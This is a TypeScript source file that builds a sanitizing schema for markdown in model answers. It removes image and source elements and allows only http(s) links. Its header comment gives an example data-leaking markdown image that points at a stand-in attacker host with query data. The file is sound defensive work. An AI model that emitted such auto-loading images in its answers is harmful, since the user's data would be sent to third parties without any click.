// What a model answer may render. Answers are text and tables, so nothing that loads
// a URL by itself is allowed: a markdown image such as ![](https://attacker.example/?d=...)
// would make the browser send query data to that host with no click. Links stay, but only
// to http(s) pages, and MarkdownRenderer opens them with rel="noopener noreferrer".
import { defaultSchema } from "rehype-sanitize";

const NO_FETCHING_ELEMENTS = new Set(["img", "picture", "source"]);

const attributes = { ...defaultSchema.attributes };
for (const tag of NO_FETCHING_ELEMENTS) {
  delete attributes[tag];
}

export const MARKDOWN_SCHEMA = {
  ...defaultSchema,
  tagNames: defaultSchema.tagNames.filter((tag) => !NO_FETCHING_ELEMENTS.has(tag)),
  attributes,
  protocols: {
    ...defaultSchema.protocols,
    href: ["http", "https"], // no javascript:, data:, mailto: or other schemes
    src: [], // no element may load a source
  },
};
